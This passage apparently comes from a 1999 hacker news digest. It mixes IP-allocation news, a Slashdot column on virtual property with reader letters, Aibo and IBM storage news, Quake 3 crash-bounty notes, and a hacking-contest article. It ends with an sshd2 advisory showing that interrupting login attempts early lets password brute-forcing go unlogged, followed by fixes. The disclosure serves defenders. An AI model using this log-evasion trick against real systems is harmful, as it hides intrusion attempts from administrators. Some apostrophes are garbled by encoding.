      application for a Class A allocation was turned down. @Home ended up getting numerous smaller Class B
      allocations, creating some controversy among local registries. 
      
      The legacy space doled out to those that had the foresight to ask for it is the source of jealousy for
      many latecomers. They point out that while Mercedes Benz holds nearly 17 million addresses, only 1.04 
      million have been allocated to the entire nation of China. 
        
      "There are a number of different business issues we foresee in the future that will require IP 
      addressing," said Bill Hurley, manager of new media and relationship marketing for Mercedes Benz.
      "We are looking to have an IP address for every car."
      
      ICANN no doubt will be pressured to tip the scales toward those who have IP envy. 
      
      "Some people in Africa and South America want their own regional registries. Some of the ISPs want to
      have a bigger role in how the allocation is done," acknowledged Commerce Department spokeswoman Becky Burr,
      who is overseeing the agreement with ICANN. 
      
      "There may be a more complicated mix of players," she added. "But it still will be a fairly straightforward
      allocation system."
      
      Despite pessimism about shortages in IP space and the politics of allocation, some legacy holders have 
      voluntarily surrendered their blocks for the good of the Net community, such as the Defense Department and 
      BBN, now owned by GTE. Stanford University also is in negotiations to return part of its huge block, according
      to school and registry officials.

      Infinite Space
       
      From http://www.slashdot.org/



      Posted by JonKatz on Thursday May 13, @10:00AM EDT
      from the Virtual-Property-(cont.) dept.
      Physicists, gamers, Web designers and developers and engineers took up (with a vengeance) the question
      of whether or not the Net and the Web was an Infinite Space, forever expansible. Most felt that while
      Web Space was infinite, desirable property isn't. Also comments about crackers, cryptography, gaming, virtual property,
      the future of the Net and the Web, and concerns about whether real world property laws apply online. All in all, a great
      cyber gab-fest, pro and con. 

      E-mail poured in all weekend about Infinite Space -- whether or not space on the Net and Web is forever expansible. 

      This was an offshoot of columns and discussions here last week about whether new connective technologies like eBay
      combined with the millions of middle-class Americans pouring onto the Web were escalating the concept of virtual
      property, already a custom on some gaming sites. 

      On the subject of Infinite Space, I heard from physicists, academics, engineers, gamers, computer execs, developers
      and designers ¡ some very brainy geeks who offered smart and diverging theories. 

      While a majority of e-mailers thought virtual property was a big idea whose time had come, there were also skeptics
      claiming this idea wasn╣t really anything new. 

      In one sense, they╣re right. Gamers have been trading virtual parts, symbols and characters for awhile. But the impact
      of new technology is often felt when new and middle-class users mainstream it, not when pioneers invent it. 

      Linux isn't new either, but that doesn't mean nobody should write or talk about it. As open source reaches critical mass,
      it becomes significant. Same with other technologies from the phone to modems to computers themselves. Hackers
      were patching together BBS╣s from the earliest days of networked computing, but it wasn╣t until many more people,
      from housewives to business owners started pouring online that the Net took off. As more and more people -- most
      armed with credit cards and checkbooks -- continue to explore and use the Net and the Web, expect continuous and
      unimaginable change. But most of you know that. 

      Note: Lots of people wrote asking if I was changing my column format to include more of my e-mail responses. Yes, I
      am. An interactive column should, when possible, include more voices than one. Not only do I get sick of myself, but I
      get especially weary of getting so much smart and thoughtful e-mail nobody but me ever sees, while the often highly
      testicular public posts on Threads are visible to everybody. Many visitors, lurkers and readers confuse Threads with
      reality. It is one reality, but not the only one. 

      People have a perfect right to flame, but as my e-mail (and every other Slashdot writer and author demonstrates daily)
      smart lurkers constitute the vast, unseen majority of Slashdot readers. They also want to be seen and heard. 

      So here are just a few of the posts ¡ pro and con -- responding to my columns about virtual property and my questions
      about whether space on the Net is an Infinite Space: 


      Boredom is More Significant, from: Stephane Lajoie 

      "Is Net and Web property infinite? That is, is the Net so expansible that it could never be overcrowded and congested? 

      If you abstract away things like bandwidth and hard-drive storage (which seem to grow fast enough anyway), the
      answer to the first question is yes: the net is infinite. But you seem to imply that the second question is the same as the
      first, which it isn't. 

      Crowdedness happens in a specific physical place. We can say that New York City is crowded, while Arkansas is
      close to empty. If we extend this concept to the net, you can say that slashdot.org is crowded while kgjrhegh.com is
      empty (the DN isn't even registered, anybody could move in there for free; not anybody could move in to
      Microsoft.com though). 

      The same thing happens in physical space: if you abstract away things like the currently limited means of transportation,
      you can come to the conclusion that living space for humans in the universe is infinite. But just like people go to
      slashdot.org and not to kgjrhegh.com, you won't see people moving to Mars en masse even if affordable transportation
      becomes available: there just isn't anything fun to do there. I think it is Linus Torvalds who said that in a few decades,
      the primary motivation for people to do "anything" will be fear of boredom. 

      The limit here isn't free domain names or available land in an online game. It's the attention span of people. People buy
      powerful characters in UO to get attention from other players. Once the game become dated and people start moving
      to Everquest, Asheron's Call or others, these characters will loose all their value because there won't be anybody to
      show them off to. 

      You can't open a 20 screens megaplex in Nowhere, Arkansas. You can't sell web adds at kgjrhegh.com. Hope I could
      keep your attention for that long :). 

      PS: The Cyber-Movers example was kinda weak. I mean, it's a bunch of engineers copying files around and setting up
      domain name servers. Hardly the signs of a revolution if you ask me :). Still, very interesting subject matter. 

      PPS: I like this format of writing series of articles instead of moving on to a new subject for each article. 

      StΘphane Lajoie / Ludus Design 


      Nanotechnology and other answers, from Rob Jellinghaus: 

      "Is Net and Web property infinite? That is, is the Net so expansible that it could never be overcrowded and congested?"

      This question is familiar in another domain: nanotechnology. The general form of the question is, "Given sufficient
      technological development, are resources potentially inexhaustible? And if so, what happens to the economy?" 

      In general, it is scarcity that creates value. In a world where there are infinite amounts of everything, there is no reason
      for everything not to be free. But when there is only so much of something, then competition arises for that scarce
      resource, and suddenly you need a way to determine who needs/wants/deserves it most. Presto: economics. 

      Ultima Online could probably, in principle, expand their cyberverse to accomodate the influx of people craving land. But
      it's not clear that they should. The scarcity of land there is greatly increasing the value of each individual property,
      perhaps intensifying the fervor of their citizens, and certainly buying them advertising that they couldn't buy with their
      own money (your article being a great example). In other words, by keeping their virtual real estate scarce, they are
      more effectively competing for the attention of the world's gamers, by making it clear just how valuable that real estate
      is. 

      In fact, UO (Ultima Online)perfectly exemplifies the two resources that are _not_infinite, and will never be: Human
      attention, as all domain name squatters know, is finite. There are only so many eyeballs, and only so many hours in a
      day that those eyeballs can be looking at your little corner of the cyberverse. UO is competing with Everquest (which is
      coming up fast). Catchy domain names ("slashdot.org") for instance, will always be more valuable than clunky ones
      ("www.mybiglongcompanyname.net"). 

      - Computing and, especially, network resources are getting exponentially cheaper, but as exponentially more people go
      online, it remains fairly costly to serve large audiences. UO definitely incurs ongoing costs in hardware, network
      maintenance, and operations management, to keep its servers running; if they were to expand their universe infinitely,
      their costs would also expand infinitely. Later. 

      Anyway, thanks for the thought-provoking questions, 

      Liberating the Lurkers, from Dana Ryder, IMMSystems: 

      "Congrats on the new format, if that╣s what it is. You are liberating the Lurkers! Posting comments like you are is the
      only way some of us can get our ideas out and hear the good ideas of others. The rule on Slashdot Threads seems to be
      that the dumber one is, the quicker you are to claim you╣re smarter than everybody else, or that you already knew
      everything everybody else is saying. I can╣t fault anybody for being stupid, but boy, are these people proud of it!
      Slashdot╣s columns on Virtual Property were talked about all day at my company ¡ keep ?em coming!" 


      Of Course Not, from: Randall L Joiner: 

      "To your question about Infinite Space 

      There are several answers: Of course not, physical (hardware) resources are limited by definition, and thus, eventually
      will run out. Within reason, yes, it's infinite, as tech grows, space keeps getting cheaper, there will always be room of
      some sort. 

      The question really is, is valuable web property infinite? Many people have already answered that, and from the skim I
      did, most seem to think no. I have to disagree to an extent. Since games and sites only seem to hold interest for short
      time periods (game attention spans often measure in hours of game play), and people are constantly searching for the
      next game, I would guess that the interest of the gamers will constantly be going through these stages: 

      1. New game hits, is relatively unknown. 

      2. Some gamers become regulars, game grows to a small number of players. 

      3. Game catches on in the main stream, many people start playing. 

      4. The original players start tiring of it, (for various reasons) and sell out. 

      5. Older players go back to stage 1 with some other new game. I think we'll start seeing stage 5 in about 6 months to a
      year with Ultima. I give Diablo as an example... Few still play it, because everyone's jumped to Ultima. The new
      up-and coming is EverQuest. It's part of the game cycle, only now we have the middle-class coming in throwing money
      around. I want to know what's going to happen when the mass evac happens for the next great game, and the fools are
      stuck with character's they've spent loads of $ on, and are now not worth anything, and no one is around to play the
      game with? Even the "rich" couldn't keep up for to long, constantly buying new characters for each new game. 

      Another problem I don't think you've thought of... What happens if there's a network down time? What happens
      if/when a hard-drive crashes and wipes out any record of you having owned the property? 

      If I were the company running the hardware those games are running on, I'd make damn sure I had a clause stating
      they aren't responsible for lost characters/property/etc... 

      Another problem. What happens when (not _if_) someone hacks a game and suddenly goes nuts with it? How about
      Virtual Theft? If I cracked the game, steal your house that you just paid 100,000 for, what recourse do you have? Then
      there's the difficulty with calling it property... We have a bung-hole load of property laws in the states, but do any of
      them apply to cyberspace? How about in a game where killing and taking property is a legal action? If I kill your
      character and taken the property you just bought, do you have any legal recourse in RL? No, I really don't consider that
      a silly problem either, as I've read some of the things people have gone to court over (and won!) that are much much
      more silly. Altogether, I'm just completely amused by the concept, and consider this just one more proof that most
      people really don't understand what the world or the net is really about." 


      Please! Absolutely Nothing New Here, from: thom stuart (painfully): 

      Much as it pains me every single time I realize it, I'm afraid that I have to report that once again you're picking value
      out of vapor and getting all excited about something that, as always, isn't exciting or new at all. 

      I'm tempted to launch into an extensive diatribe, but i've got work to do today. Suffice it to say that the "virtual property"
      that's got you so frantic in the last couple days is nothing more than a sale of service. 

      It's amazing that you're managing to misunderstand this to the extent where you think there's something new. Every
      month i buy a package of 'minutes' for my mobile phone from my wireless company. These are just numbers in a
      computer, of course - am I purchasing "virtual property" here? And, if i am, haven't people been doing that for years? 

      I could subscribe to a paying-members-only web site; I could choose to pay for HBO; I could buy an Ultima Online
      account or good domain name from ebay. These are all the same thing - I'm buying the right to use a service. Just
      because I╣m not getting a physical product in return doesn't make it magic or 'cyber' or anything else you might want to
      think. 

      Okay, the UO accounts and domain names might have certain 'added value' in terms of the time/effort invested in
      bringing them to their current status, but that doesn't make it any different. by buying an account or a domain, the
      purchaser is simply entitled to access to certain kinds of service in return for their cold hard cash - but hey, who pays in
      "physical cash" these days, anyway? 

      Ooh! ooh! virtual property paid for with "virtual money"! another monumental technological discovery from jon katz!
      better write another /.column about this! please. 


       Crackers, Gaming and Infinite Space (anonymous): 
      
       Here's a copy of the comment I just posted... thought you might like it...BTW great set of articles, and I find your style
       to finally have settled out into something that doesn't seem megalomaniacal and much more suited to the world you've
       stepped into.. I've liked about 75% of your articles, those I didn't like were some of the earlier ones: 
      
       It's bad enough that hackers are being berated by main stream media for supposedly "stealing" from large, anonymous
       corporations, can we all see what will happen when the middle class has a vested interest in computer security? 
      
       What were to happen if a cracker got onto one of the Ultima online servers, helped himself to some UO Cash and then
       bought himself whatever he needs? Worse yet: Cracker gets onto the server, figures out some of it's data structure, and
       decides to get into another player's building and cleans him out? 
      
       Crackers/malitious hackers finally have something that has value to steal and they would be stealing from mainstream
       america instead of the corps. 
      
       This can have several consequences as I see it: 
      
       First and formost: The biggest hacker backlash in history. You think the Kevin Mitnick case was bad... now the law
       enforcement officials no longer have to work on the "estimated losses" reported by companies when they get
       documents copied off their servers (say source code), they have real world price tags on what the damages were. 
      
       Moreover, can we really trust mainstream american media to see the difference between hackers and crackers? It's
       bad enough that they can't do it now when the crackers are just defacing websites. 
      
       Secondly: With a bit of luck, this will drive all aspects of computer security forward. I can see dedicated players paying
       godo dollars for crypto systems that would protect their online assets. As well, Internationalization of crypto technology
       will be given a big boost as non-North american players will want access to the same quality of crypto as we are
       privileged to have. 
      
       Thirdly: Goverment regulation will quickly be pushed onto the scene. Any location generating real US$ seems to
       become the target of the US house and senate. 
      
       Third, B: TAXATION! As is, it's very difficult to keep the internet taxes at bay. 
      
       In the states, the problem seems to stem from the separation of states.. but if people start shelling out cash for virtual
       property, the likes of which cannot be seen right now, there will be a renewed effort by the USG to tax online
       transactions. 
      
       Fourth: Hopefully this will lead to the apparition of "free" servers that will pop up and have much more room to grow,
       allowing people to settle in. It'd be even nicer if a "Homesteading" act were to be implemented on UO (specific
       example) to move over onto the new systems, giving them some sort of bonuses (very much like the development of the
       "Wild West in early America.) 
      
       From Craig Wright: Interesting, But Shame On You! 
      
       Virtual Property is an interesting issue but really is nothing new. Buying "space" from a isp for a large website has been
       around for years, paying someone else to build the website is comonplace, digitizing a photograph, and how about
       DOMAIN NAMES? - these are all forms of virtual property. Middle class americans have been paying cash for
       ownership of virtual materials for some time now. 
      
       Focusing on some geeks who spend too much on UO characters on ebay and then implying from that fact the economy
       is undergoing a fundamental change is really quite silly. Put your technophile cheerleader pom poms down and do a little
       research willyah? 
      
       Within the online gaming comunity there are other useful examples of virtual property such as Chron-X, Sanctum and
       other budding online games working on a far different paradigm than the "service" model of the "pay-as-you-play"
       games such as UO. C-X and Sanctum are wholly or partially based around the collectable card game paradigm
       introduced years ago by MAGIC: THE GATHERING. 
      
       The interesting thing about the online versions (which have been around for at least three years or so) is that they are
       ENTIRELY virtual property. 
      
       Unlike UO-type games where you have to buy the software and pay an ongoing service fee to keep playing. In these
       other games the only thing that one pays for is the virtual cards (software free, no fees except paying for more cards
       should you want them). As one might expect, trading, auctioning, and selling collections has been an integral part in the
       development of these games. I believe C-X at one time had over 70k accounts and may have plenty more now that
        they have moved to a Sony gaming site (I haven't played for nearly a year). 

      As a matter of fact Genetic Anomalies, the company behind Chron-X, began as a company devising a method for
      protecting virtual property and developed with what they call Collectible Bits (back in 1996 I believe) and designed their
      the game primarily as a way to illustrate what their software product could do in terms of reducing stealing and hacking
      problems already the cause of so many problems in various online gaming communities. UO tangent: it is neither the
      first, best nor probably even the largest of its genre. The 150k players - that's BS, online games inflate their players by
      counting ACCOUNTS rather than active players, many players play for a while and then either reduce their playing
      time significantly or stop playing altogether - but their ACCOUNTS are still counted. This is especially problematic with
      UO as there are a half dozen or so games all currently in stiff competition for the same audience. 

      By the way, UO is the only one of its genre in which its participants have attempted to bring a class action suit against
      the company because of their dissatisfaction with the game. The whole genre is unlikely to become a dominant faction
      within the online gaming community merely because it is so damn expensive to play. There have been dozens of
      experiments for specific subscription games or subscription gaming sites of several varieties and none have achieved
      more than moderate success. 

      I read a few of the /. comments on your first piece and ran across thoughful responses that disagreed with you which
      also made interesting points -- yet in your article you quote a few imbicilic flames as representative of those who
      disagree and more thoughtful responses of those who agree. This is a rather cheap way to make your argument appear
      stronger - shame on you! (Note: I only quote from e-mail, since thoughtful (and non-thoughtful) disagreements are
      posted openly on Threads. And I didn╣t get many disagreements last week. I always reflect an accurate balance of
      criticism versus agreement ¡ discussions where everybody agrees are sort of pointless, and, on the Net, impossible. As
      for nasty flames, they never bother me a bit ¡ kind of like mosquitoes or peas off a tank. Knowledgeable or thoughtful
      criticism, on the other hand, terrifies me).

 38.0 Aibo, Sony's new robotic dog, at $2500US a pop don't dump your furby just yet...
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Sony's robotic dog: cute, but not cuddly 
      By Stephanie Miles
      Staff Writer, CNET News.com 
      May 11, 1999, 1:05 p.m. PT 
      URL: http://www.news.com/News/Item/0,4,36375,00.html 
      
      update Could Sony's new Aibo be a robotic--and canine--version of a Trojan horse, this time used to smuggle 
      the electronic giant's new technology into homes around the world? 
      
      Probably not, analysts say, but Aibo will bring robotics into the home, along with other new Sony technologies. 
      
      Announced today, Aibo is an electronic pet capable of acting in response to external stimuli and communicating
      with its owner. Intended for entertainment purposes only, the introduction of the robotic dog contains shades 
      of the company's previous entertainment product, the PlayStation. Once introduced as a pure gaming platform, 
      the PlayStation now includes computing components such as DVD drives and Internet access. 
      
      The introduction of the electronic pet is probably not a subversive method of ingratiating Sony technology 
      into the American home, especially because Aibo is only projected to sell 2,000 units in the United States next
      year, according to Sean Kaldor, an analyst with International Data Corporation. 
      
      "I don't think this is their vehicle to propagate technologies into the mass user scale," Kaldor said, noting 
      that Aibo can only perform very limited functions and can't even fetch yet. Plus, he noted, the toy is priced 
      around $2,000, which will probably discourage mainstream acceptance. "This isn't a stealth way to mass-introduce 
      a product." 
      
      But Aibo may be some Americans' first opportunity to play with Sony's Memory Stick, a portable, re-recordable 
      storage media 1.5 inches long with the thickness of a piece of gum. Sony is selling an 8MB Memory Stick accessory 
      that can store commands for Aibo. 
      
      Aibo is also one of the first devices shipping running on Sony's Aperios real-time embedded operating system.
      Sony struck a deal with General Instrument last year, licensing the operating system for use in GI's set-top boxes. 
      
      "There's a lot of operating systems out there, and this is Sony's proprietary operating system," explained Seamus 
      McAteer, an analyst with Jupiter Communications, expressing doubts that Sony is attempting any significant attempt 
      at marketing or promoting Aperios through Aibo. 
      
      "You're not going to have a ton of developers developing a lot of applications to run on this device, so it doesn't
      buy you a whole lot," he said. "Whoever's going to buy this really doesn't care which real-time OS it is using. 
      It's a design win, but not a big deal." 
      
      Americans are not likely to shell out $2,000 for a programmable dog that does not yet fetch, but Aibo is likely to
       succeed in the Japanese market, which wholeheartedly
      embraced the Tamagotchi electronic toys, Kaldor said. 
      
      "The Japanese perspective on technology is warm and fuzzy," he said. "Robots in Japan are seen as very compelling
      things, unlike in the U.S., where they seem cold and harsh."

 39.0 IBM Breaks more records for higher density storage in hard disk units
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Wednesday May 12 4:02 AM ET 

      IBM Researchers Claim New Data Storage Record
      
      SAN JOSE, Calif. (Reuters) - International Business Machines Corp. (NYSE:IBM - news) said it plans to announce 
      Wednesday that its researchers have set a new world record for high density data storage.
      
      The company said it has doubled its old record by packing data so tight that 20.3 billion bits can fit in a 
      square inch of data storage -- pushing up against what many analysts believe to be the physical limits of such 
      technology.
      
      At the new level of density, every square inch of disk space could hold 2.5 billion bytes -- equivalent to two
      TV-quality movies or the text of some 2,500 average-sized novels. Eight bits equal a byte. A byte can store about
      one character of text. 
      
      The new disk drives are 3.5 times more dense than IBM's highest capacity product, a disk drive for portable 
      computers capable of storing nearly 6 billion bits per inch of data.
      
      The new developments have been demonstrated only in IBM's research labs, the company noted.
      
      It could take two to three years before IBM is ready to incorporate the technology into commercial products from
      IBM, or in disk drives that IBM's technology manufacturing unit increasingly builds for other computer makers, it
      said.
      
      ``This laboratory demonstration is very good news for our customers and the data storage industry,'' said Robert
      Scranton, director of recording head technology at IBM's Almaden Research Center.
      
      ``It shows that disk-drive capacities will continue to increase well into the 21st Century,'' he said.
      
      The greater storage capacity could be used to boost the capabilities of portable electronics that use IBM's tiny
      1-inch microdrive data storage disks or laptops using its 2.5-inch drives, the company said.
      
      The extra capacity can be used to store recorded music or data-intensive graphics or video that would be impractical
      using current technology. 
      
      In addition, large corporations could use such ultra-high-capacity drives to store far more data in storage systems 
      using the same floor space. 
            
      ``The stability of the bits was especially encouraging,'' Scranton added, referring to possible fluctuations in 
      storage media used in such systems when pushed to such extremes.
      
      ``To make smaller bits, we improve both the disk materials and the read-write components to ensure that the bits'
      magnetic orientations will not change by themselves, yet the user can still quickly and reliably erase and rewrite 
      bits,'' he said.
      
      IBM, which is headquartered in Armonk, N.Y., invented computer hard disk technology in the 1950s and continues to 
      be a leader in advancing the storage capacity of computers.
      
      The first technical details of the new storage system will be disclosed next week at the International Magnetics 
      Conference (Intermag 99) in Kyongju, Korea.

      You can bias the level of detail lower than allowed in the

      lod. The view weapon will look very ugly. 
      
      Another little speedup option that isn't offered in the menus is: 
      "cg_simpleitems 1" this removes the extra rings and spheres around 
      some items. 
      
      You can also turn off all the gibs with "cg_gibs 0".

      5/11/99 
      ------- 
      Do NOT send bug reports and game comments directly to me! 
      If I have to filter through hundreds of emails a day, I won't get any 
      more work done... Only crashtest related problems should come to me, 
      everything else should go to q3feedback@idsoftware.com. 
      
      
      5/11/99 
      ------- 
      Sami Tammilehto wins the second prize. Some large connectionless packets 
      can cause crashes. 
      
      This one was a result of me having the maximum token size defined lower 
      than the maximum string size. 
      
      
      5/11/99 
      ------- 
      BigImp wins the first prize. It doesn't crash the server, but fmtspec 
      names will crash all clients that try to log on. Technically that would 
      be an upkeep required DOS attack, but I'll let this one go. 
      
      I even had a "FIXME: make vsprintf safe" comment by the offending line... 
      
      I am going to update the server to filter out all % chars that come in 
      over the net to prevent any other similar things. 
      
      
      
      5/11/99 
      ------- 
      Everyone should realize that many popular net links are going to be clogged 
      up with q3test downloads for a while, so net play may be a bit patchy to 
      a lot of servers. 
      
      ------------- 
      
      Now that the first win32 test is out, here is The Plan for going forward: 
      
      All future releases should be same-day for all architectures. 
      
      There may be an exe-only update to the current distributions if there are 
      significant problems, but it isn't scheduled. 
      
      The next major test release will include a new one on one map designed for 
      tournement play, and new executables with server and game modifications, but 
      will not require downloading a new pak0.pk3. 
      
      The release after that will introduce various teamplay rules on the original 
      two maps. This version will likely be another full download, because I 
      know that I still have a couple things to change in the map format. This 
      will probably be the first test running with the virtual machine. 
      
      The final major test release will introduce the single player game with 
      bots and ranks. 
      
      After any bugs are shaken out of that, it will be the "Q3 Demo" instead of 
      the "Q3 Test", and we should be ready to release the full game to stores. 
      
      In an ideal world, people that aren't prepared to deal with in-development 
      software would wait until then to form an opinion of the product. 
      
      --------------- 
      
***** I am offering a bounty for server crashing bugs. Q2 had several releases 
      forced out because of malicious attacks on all the public servers, so I 
      want to try and flush out what I can during Q3's testing phase. 
      
      There is a server running in the debugger here at crashtest.idsoftware.com 
      (192.246.40.68). Anyone that can repeatably hang or crash this system can 
      have a $100 prize and some misc bit of Q3A paraphenalia that I can dig up. 
      
      Operating system level attacks don't count -- only things that I can actually 
      fix or protect against in my code. 
      
      Denial of service attacks don't count if they require upkeep, but if there is 
      a fire-and-forget DOS attack, it will still count. 
      
      Any actions you can perform with the released client are fair game. Crashing 
      the client isn't good for a bounty, but I would still like to know about it. 
      
      Custom attack programs are also fair game. These are actually what I am most 
      concerned about -- malicious programs that goes through and crash all listed 
      servers. 
      
      Ideally, you would practice on a private server under your control and only 
      hit crashtest when you think you can repeat it. 
      
      If you find one, email me the instructions so I can reproduce it. Include 
      "CRASHTEST" in the subject so I won't miss it. 
      
      First come, first served, one bounty per bug. I will update crashtest with 
      our internal builds, so it will certainly be possible that an attack on the 
      released servers no longer functions on crashtest.

       Asian Conference Hosts Hacking Contest
       By Malcolm Maclachlan, TechWeb
       May 12, 1999 (4:28 PM)
       URL: http://www.techweb.com/wire/story/TWB19990512S0029 
       
       A conference in Singapore is working to show the dangers of hacking, ironically, by holding a hacking contest with thousands of dollars in prizes. The international
       Hackers Zone competition, which started Wednesday, is offering $10,000 to the first person to successfully break into servers connected to the Web and running
       security products. One server is running security products from Voltaire Advanced Data Security, while the second server is running software from Conclave Integrated
       Security.
       
       Hosted by Infosecurity Asia '99, the computer-security conference that will be held in Singapore next month, is open to anyone in the world. In order to prove the
       success, hackers have to move a file onto the server, or modify the Web page hosted there, and then send an e-mail describing their action to an address set up at
       Yahoo. The conference has promised to keep the names of all contestants confidential. 
       
       The sponsors of the contest sought to point out that they did not endorse hacking, the general term for breaking into computer networks. Some computer enthusiast
       prefer the term "cracker," using the term hacker instead to refer to any hard-core programmer.
       
       "We consider hacking a criminal offense prosecutable in many countries and we do not condone such actions," said George Kane, regional director of Conclave, in a
       statement. 
       
       Dan Farmer, a well-known computer-security expert, said such contests are not what they're cracked up to be.
       
       "Organizations do this from time to time -- it's not unusual," Farmer said. "I view them as misguided and modestly dangerous publicity stunts."
       
       There are a number of problems with such contests, he said. For one thing, the computer set-ups rarely mimic the way a network would be forced to work in the real
       world. Thus, he said, some companies use such contest to tout the invincibility of their systems and say how they foiled the world's best crackers, even though the
       world's best hackers probably would not get involved in something like this. 
       
       Companies also get free testing of their systems. For instance, they can get "attack signatures," digital fingerprints that show how people attack a certain system. These
       can be used later to help companies realize when they are being attacked in the future. Such signatures are hard to get in the real world. Furthermore, such security
       testing can be quite expensive.
       
       "10K is chump change in the corporate world," Farmer said. 
       
       Farmer is the author of Security Administrator's Tool for Analyzing Networks, a Unix tool that systems administrators use to test for security breaches in networks. The
       program, known as SATAN, caused a stir when it came out in 1995, prompting Farmer to publish multiple documents through his website explaining the rationale behind
       the software. The difference, Farmer said, is that contests encourage a certain type of behavior. 
       
       "They're sending a message that breaking into systems is OK, that they'll reward the best and brightest," Farmer said.

        Release: 05/14/1999
        Author: Zhodiac &lt;zhodiac@jjf.org>
        URL: http://www.jjf.org
        Application: sshd2 up to 2.0.11
        OS: Unix 
        Risk: Risky :), long term could gain system access.
      
        -=-=-=-=-=-=-=-=
         Introduction
        -=-=-=-=-=-=-=-=
      
              In the default instalation of sshd2 (up to 2.0.11) there is an
        open way to bruteforce a login/password, without any kind of ip logging
        by the sshd. Version 2.0.12 and newers seems to be not vulnerable to
        this attack, because it logs the ip at connection time.
      
        -=-=-=-=-=-=-=-=
         Details
        -=-=-=-=-=-=-=-= 
      
              When a ssh client connects to the daemon, it has a number
        (default is three) of attempts to guess the correct password before
        disconnecting. If we shutdown the connection before using up the number
        of attempts, the daemon will not log neither the connection, the
        password guesses nor the ip of the client.
      
              One cristal clear example:
      
        [zhodiac@piscis zhodiac]$ ssh -l zhodiac piscis
        zhodiac's password: 
        zhodiac's password:
        zhodiac's password:
      
        Disconnected; authentication error.
        [zhodiac@piscis zhodiac]$  
      
        In /var/log/messages:
      
           May  9 12:42:53 piscis sshd2[1391]: User authentication failed:
           'Authentication method disabled. (user 'zhodiac', client address
           '192.168.1.1:1344', requested service 'ssh-connection')'
              
              Now we try the bug:
      
        [zhodiac@piscis zhodiac]$ ssh -l zhodiac piscis
        zhodiac's password:
        zhodiac's password:
        zhodiac's password: FATAL: Received signal 2.
        [zhodiac@piscis zhodiac]$ ssh -l zhodiac piscis
        zhodiac's password:
        zhodiac's password:
        zhodiac's password: FATAL: Received signal 2.
        [zhodiac@piscis zhodiac]$ ssh -l zhodiac piscis
        zhodiac's password:
        zhodiac's password:
        zhodiac's password: FATAL: Received signal 2.
        [zhodiac@piscis zhodiac]$  
       
              Those  "FATAL: Received signal2." are the response of
        interrupting the program with a ^C.
       
              Lets see what syslog did:
      
        May  9 12:44:41 piscis sshd2[1403]: Remote host disconnected: Connection
        closed.
        May  9 12:44:44 piscis sshd2[1405]: Remote host disconnected: Connection
        closed.
        May  9 12:44:47 piscis sshd2[1407]: Remote host disconnected: Connection
        closed.
      
              No ip, no password guesses attempts on the logs!
        So a bruteforce can be done without any kind of logging... Sorry
        script-kiddies, no program available!
      
        -=-=-=-=-=-=-=-=
         Quick Fix
        -=-=-=-=-=-=-=-=
      
              Edit the file sshd2_config (usually at /etc/ssh2), set the value
        of "PasswordGuesses" to 1. With this each time a password is tried it
        will log it in the following way:
      
               May  9 12:46:07 piscis sshd[1308]: User authentication failed:
        'Authentication method disabled. (user 'zhodiac', client address
        '192.168.1.1:1527', requested service 'ssh-connection')'
      
               It is also recommended to set the value of "ListenAddress" so we
        will have more control of which ips can use our ssh service.
      
              A better solution is to upgrade to 2.0.12 version or newer , with
        them at connection it will log via syslog in the following way:
      
           May  9 15:23:33 piscis sshd2[7184]: connection from "192.168.1.1"

 43.0 Neil Stephenson's new book "Cryptonomicon"
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      
      æCryptonomiconÆ:
       Turning point
       for cult author
       Neal Stephenson embarks
       on multi-novel epic journey
       By Alan Boyle
       MSNBC





       May 12   The Hacker Hemingway looks the part: In his publicity photo, he strikes a cross-armed
       pose in goatee, close-cropped hair and shades. But Cryptonomicon author Neal Stephenson, a
       family man pushing 40 as well as a leading light in cyberpunk lit, jokes that his image could use an
       overhaul. I may have to lose the goatee, he says.
       
             ALONG WITH the comparisons to Ernest Hemingway and Thomas Pynchon, Stephenson has won praise for his
      fanciful visions of not-all-that-distant technological futures. In his 1992 novel Snow Crash, he depicted a
      virtual-reality realm called the Metaverse, which seemed to presage the rise of Internet culture. In 1995, 
      Diamond Age blended neo-tribalism with nanotechnology and an almost Big Brotherly global communications network. 
             All this has brought Stephenson a loyal following among computer adepts and led Newsweek to use the Hacker
      Hemingway tag. His book is on Amazon.comÆs top-10 list. But during a book-tour interview, Stephenson confessed that
      he was sometimes uncomfortable with his hacker-cult status.
             I find that the standard attitude of young people now people in high school, in college, in their 20s 
      is this image of hip, jaded, ultracool detachment, he said. IÆve noticed that there are a fair number of people
      like that who assume  IÆm one of them. IÆm actually not. I actually find people like that kind of annoying.
             
      PAST AND PRESENT
             
             Cryptonomicon may mark a turning point for Stephenson. One of the things I developed a reputation for with the
      other books was speculating about future technologies, good or bad, he acknowledged. And readers who come to
      æCryptonomiconÆ looking for that kind of thing arenÆt going to
      get it.
             
             Unlike the futuristic Snow Crash or Diamond Age,StephensonÆs latest work focuses on the past and a plausible
      present: the battles over secret codes in World War II, modern-day deals to create data havens  and, of course,
      heroes who uncover a dark conspiracy that bridges the decades. ItÆs a cross between Raiders of the Lost Ark and
      The X-Files, weighing in at 918 pages. The length isnÆt the only thing imposing about Cryptonomicon: The bookÆs huge
      cast includes historical figures such as code-breaking mathematician Alan Turing  and Army Lt. Ronald Reagan. Characters
      expound upon the intricacies of high-tech business plans and CapÆn Crunch cereal. 
             
             But most of all, the novel revolves around cryptography:keeping secrets and unlocking them. In fact, 
      Cryptonomicon boasts a how-to appendix that, by some accounts, would violate encryption export laws if it were
      transmitted abroad electronically.
      
             The appendix on the Solitaire encryption algorithm, which uses a deck of cards rather than a computer to encode
      secret messages, was written by Bruce Schneier, author of Applied Cryptography. Stephenson himself is well-versed
      in the mysteries of software code but doesnÆt profess to be a crypto expert.
             
             I tried to keep it real as much as I could, Stephenson said. There are places where the book deviates somewhat
      from complete technical accuracy. I actually posted a little FAQ document specifically aimed at people who know about
      crypto, because I know people who know crypto are going to see some things that I glossed over.
             
      DEALING WITH CELEBRITY
             
             Over the years, Stephenson has dealt with more than one bout with cyber-lebrity, and he says his experience is
      serving him in good stead this time around. HeÆs avoiding broadcast interviews on this tour, since he says all of my
      most horrifying experiences on the last tour were trying to explain my book on television. 

             He also manages to keep his public life separate from his private life. He quickly declines to discuss the effect
      of cyclical fame on his family in Seattle, and heÆs reluctant to talk about the grander meanings behind his writing.
             
